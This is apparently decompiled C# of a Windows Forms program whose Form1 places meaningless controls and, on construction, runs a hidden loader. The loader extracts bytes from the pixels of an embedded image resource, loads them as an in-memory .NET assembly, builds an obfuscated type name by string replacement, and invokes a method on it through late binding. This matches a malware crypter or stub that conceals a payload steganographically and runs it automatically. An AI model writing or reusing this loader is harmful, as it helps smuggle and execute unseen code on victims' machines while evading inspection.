using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using HX.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace HX;

[DesignerGenerated]
public class Form1 : Form
{
	public class aj
	{
		public void ba()
		{
			Bitmap image = Resources.image;
			List<byte> list = new List<byte>();
			checked
			{
				for (int i = 0; i <= ((Image)image).get_Height() - 1; i++)
				{
					for (int j = 0; j <= ((Image)image).get_Width() - 1; j++)
					{
						Color pixel = image.GetPixel(j, i);
						list.Add(pixel.R);
						list.Add(pixel.G);
						list.Add(pixel.B);
					}
				}
				Assembly assembly = Assembly.Load(list.ToArray());
				object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet((object)null, typeof(Activator), "CreateInstance", new object[1] { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.GetType("D$ayIt".Replace("$", "ll.TouchItBringItP")))) }, (string[])null, (Type[])null, (bool[])null))));
				NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "j", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			}
		}
	}

	private IContainer components;

	[AccessedThroughProperty("HScrollBar1")]
	private HScrollBar _HScrollBar1;

	[AccessedThroughProperty("FolderBrowserDialog1")]
	private FolderBrowserDialog _FolderBrowserDialog1;

	[AccessedThroughProperty("NumericUpDown1")]
	private NumericUpDown _NumericUpDown1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("ListView1")]
	private ListView _ListView1;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	internal virtual HScrollBar HScrollBar1
	{
		get
		{
			return _HScrollBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_HScrollBar1 = value;
		}
	}

	internal virtual FolderBrowserDialog FolderBrowserDialog1
	{
		get
		{
			return _FolderBrowserDialog1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_FolderBrowserDialog1 = value;
		}
	}

	internal virtual NumericUpDown NumericUpDown1
	{
		get
		{
			return _NumericUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NumericUpDown1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual ListView ListView1
	{
		get
		{
			return _ListView1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListView1 = value;
		}
	}

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		HScrollBar1 = new HScrollBar();
		FolderBrowserDialog1 = new FolderBrowserDialog();
		NumericUpDown1 = new NumericUpDown();
		PictureBox1 = new PictureBox();
		ListView1 = new ListView();
		ListBox1 = new ListBox();
		((ISupportInitialize)NumericUpDown1).BeginInit();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		HScrollBar hScrollBar = HScrollBar1;
		Point location = new Point(148, 42);
		((Control)hScrollBar).set_Location(location);
		((Control)HScrollBar1).set_Name("HScrollBar1");
		HScrollBar hScrollBar2 = HScrollBar1;
		Size size = new Size(80, 17);
		((Control)hScrollBar2).set_Size(size);
		((Control)HScrollBar1).set_TabIndex(0);
		NumericUpDown numericUpDown = NumericUpDown1;
		location = new Point(189, 128);
		((Control)numericUpDown).set_Location(location);
		((Control)NumericUpDown1).set_Name("NumericUpDown1");
		NumericUpDown numericUpDown2 = NumericUpDown1;
		size = new Size(120, 20);
		((Control)numericUpDown2).set_Size(size);
		((Control)NumericUpDown1).set_TabIndex(1);
		PictureBox pictureBox = PictureBox1;
		location = new Point(169, 166);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(100, 50);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(2);
		PictureBox1.set_TabStop(false);
		ListView listView = ListView1;
		location = new Point(137, 79);
		((Control)listView).set_Location(location);
		((Control)ListView1).set_Name("ListView1");
		ListView listView2 = ListView1;
		size = new Size(121, 97);
		((Control)listView2).set_Size(size);
		((Control)ListView1).set_TabIndex(3);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		location = new Point(37, 88);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		size = new Size(120, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(4);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(284, 261);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)ListView1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)NumericUpDown1);
		((Control)this).get_Controls().Add((Control)(object)HScrollBar1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((ISupportInitialize)NumericUpDown1).EndInit();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
		aj aj = new aj();
		aj.ba();
	}
}
